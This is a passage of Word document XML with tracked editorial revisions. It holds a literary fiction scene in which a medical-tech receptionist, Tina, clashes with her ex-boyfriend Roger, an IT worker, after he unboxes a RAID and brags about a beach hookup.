            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Roger. Package for u. Come get.</w:t>
      </w:r>
      <w:r w:rsidR="000D3488"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spent the next several minutes staring at the box, trying to wish it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raucous conversation from the hallway announced Roger’s arrival. Roger’s tall, lean-muscled form strode toward the lobby, accompanied by two older men. Framed by his spiky hair and narrow black-framed glasses, his face wore its usual self-satisfied smirk. He opened the glass door with a sinewy arm adorned with Celtic sleeve tattoos, and sauntered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didn’t say </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a word</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>! That’s the whole point!” he said cheerfully.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not even ‘Hi</w:t>
      </w:r>
      <w:ins w:id="435" w:author="TextVet" w:date="2016-03-15T15:18:00Z">
        <w:r w:rsidR="002444ED">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w:t>
      </w:r>
      <w:del w:id="436" w:author="TextVet" w:date="2016-03-15T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002444ED">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asked one of the men. He sported a </w:t>
      </w:r>
      <w:ins w:id="437" w:author="TextVet" w:date="2016-03-15T15:20:00Z">
        <w:r w:rsidR="00240371">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>well</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="438" w:author="TextVet" w:date="2016-03-15T15:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00240371">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>neatly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-trimmed beard and a lab coat. “You just walked up to her out of the blue and</w:t>
      </w:r>
      <w:ins w:id="439" w:author="TextVet" w:date="2016-03-15T15:21:00Z">
        <w:r w:rsidR="00366734">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="440" w:author="TextVet" w:date="2016-03-15T15:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00366734">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bam!</w:t>
      </w:r>
      <w:ins w:id="441" w:author="TextVet" w:date="2016-03-15T15:21:00Z">
        <w:r w:rsidR="00366734">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="442" w:author="TextVet" w:date="2016-03-15T15:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00366734">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start</w:t>
      </w:r>
      <w:ins w:id="443" w:author="TextVet" w:date="2016-03-15T15:22:00Z">
        <w:r w:rsidR="00B803A3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> making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 wasn’t out of the blue,” </w:t>
      </w:r>
      <w:del w:id="444" w:author="TextVet" w:date="2016-03-15T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D855C1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sai</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="445" w:author="TextVet" w:date="2016-03-15T15:23:00Z">
        <w:r w:rsidR="00A5794B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>parrie</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="446" w:author="TextVet" w:date="2016-03-15T15:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A5794B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>d</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="447" w:author="TextVet" w:date="2016-03-15T15:22:00Z">
        <w:r w:rsidR="00D855C1">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Roger. “We’d been eyeing each other across the bonfire for like ten minutes. We both knew what was up.” His eyes landed on the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>package beside Tina’s desk. He pulled a jingling keychain out of his back pocket and squatted beside the box. “She was there at the beach with a bunch of her friends,” he continued as he carved the cardboard open with a key, “and we were all sitting around the fire. Alki Beach gets kinda cold at night, you know, and this little blonde was wearing, like, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nothing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> — a bikini bottom and half of a white t-shirt, right? Anyway, some guy was playing Spanish guitar, and we were passing a joint around… I’m telling you, you guys have </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>got</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to come out to Alki one of these nights.”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other man, heavy</w:t>
      </w:r>
      <w:del w:id="448" w:author="TextVet" w:date="2016-03-15T15:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EC0242">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set and sloppily dressed, smiled. “We’re both married men, Roger. But it’s nice to see you kids having fun.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00D211EB" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="449" w:author="TextVet" w:date="2016-03-15T15:25:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="450" w:author="TextVet" w:date="2016-03-15T15:25:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D211EB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he box’s tape finally undone, Roger flipped open the top</w:t>
      </w:r>
      <w:ins w:id="451" w:author="TextVet" w:date="2016-03-15T15:25:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="452" w:author="TextVet" w:date="2016-03-15T15:25:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D211EB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> reached inside with both hands. In a flurry of Styrofoam</w:t>
      </w:r>
      <w:del w:id="453" w:author="TextVet" w:date="2016-03-15T15:26:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00DB563B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> packing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> peanuts, he withdrew a dense black cube, slightly larger than a desktop computer and lined with slots, lights, and sockets.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in the white coat asked, “Is that the big fancy hard drive you’ve been promising us?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00FA1561" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="454" w:author="TextVet" w:date="2016-03-15T15:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Studying his catch, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Roger nodded </w:t>
      </w:r>
      <w:ins w:id="455" w:author="TextVet" w:date="2016-03-15T15:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>preteenish joy</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="456" w:author="TextVet" w:date="2016-03-15T15:28:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00FA1561">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>excitedly as he examined the equipment</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “It’s a forty-terabyte RAID. Think this’ll be enough storage space for you lab monkeys?”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trim-bearded biologist nodded. “How soon can you connect it to the network?”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stood up, cradling the device. “I’ll set up the NAS this afternoon. But whether any of your weird-ass mad scientist toys can talk to it or not… Well, that’s up to Don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heavy</w:t>
      </w:r>
      <w:del w:id="457" w:author="TextVet" w:date="2016-03-15T15:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C4D8E">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set man saluted. “I’ll get my boys setting up NFS support on the robot controllers as soon as that thing’s ready.”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biologist chuckled, “Forty terabytes. Try not to fill it up with pictures of your girlfriends, Roger!”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Speaking of pictures…!” Roger set the RAID down on Tina’s desk, and pulled out his phone. “This is the little hottie from the beach last night.”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The two men gathered around the small screen. “She’s a knockout, alright,” </w:t>
      </w:r>
      <w:del w:id="458" w:author="TextVet" w:date="2016-03-15T15:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D15E40">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="459" w:author="TextVet" w:date="2016-03-15T15:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00012F81">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ai</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="460" w:author="TextVet" w:date="2016-03-15T15:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D15E40">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">d </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the technician</w:t>
      </w:r>
      <w:ins w:id="461" w:author="TextVet" w:date="2016-03-15T15:31:00Z">
        <w:r w:rsidR="00D15E40">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> granted</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “What’s her name?”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fuck if I know, man! Carrie? Kelly? Carley? Something like that.” He flipped through more photos.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“Check it out. She’s got that thing with her fingernails…” The tech wiggled his own nicotine-stained fingers. “What’s it called? Where just the tips are white? There’s a word for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Tina’s gaze remained on her screen. While the men talked, she had shrunk progressively farther down in her chair, and now felt tiny enough to fit into a microplate well. “French manicure,” she murmured.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that’s it!” the tech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glanced at her. His smirk waned slightly. “Hey, um, guys…” he said. “I’ll catch up with you later, ’kay?”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two men said their goodbyes and left. Roger and Tina were alone.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he said, leaning against her desk.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I help you?” Tina asked flatly, her eyes glued to her computer.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“What’s got ya down, buddy?” His acerbic tone belied the friendly question.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scowled. “‘Buddy’?”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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>buddy</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” Roger pressed. “You </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>said</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you wanted to stay friends,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glared at him. “That doesn’t mean I want to listen to your stupid player conquests. I know you’re </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>real</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> proud of yourself, but you don’t have to rub it in my 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“Friends </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> talk about stuff like that, you know,” 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rolled her eyes. “Rog, you do realize it’s barely even been a week, right? Are you so inconsiderate that you can’t understand how your little pick-up tales affect me? Or do you just not care?”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Roger’s face puckered. “Not everything is about you, you know.”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“Everything? More like, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nothing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is about me!” Tina said, her voice rising. “You just kept chatting with your boy’s club over there as though I wasn’t right here the whole time. That’s how it was for the </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="462" w:author="TextVet" w:date="2016-03-15T15:33:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>whole</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> six months we were together. The only time you act like I even exist is when it’s convenient for you. Think about where I’m coming from </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>for just one goddamned second, okay? I sit at this desk every single day, banging out endless emails, answering phones like a fucking parrot… ‘Good afternoon! Tungsten Medical Technologies! How may I help you? May I take a message?’ I just feel so replaceable. So </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>insignificant</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. And then you came along, and I thought we vibed, and maybe you could relate… But you end up treating me worse than anyone else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Roger’s brow furrowed above his glasses. “Really, T? You’re going to use me as a dumping-ground for all your bullshit frustrations about work and life and whatever? You realize you have, like, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>zero</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> credibility for being mad, right?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broke up with </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>me</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, remember?”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I</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> broke up with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xml:space="preserve"> said you wanted to see other people!” Tina </w:t>
      </w:r>
      <w:ins w:id="463" w:author="TextVet" w:date="2016-03-15T15:35:00Z">
        <w:r w:rsidR="001B1BAA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>retorted</w:t>
        </w:r>
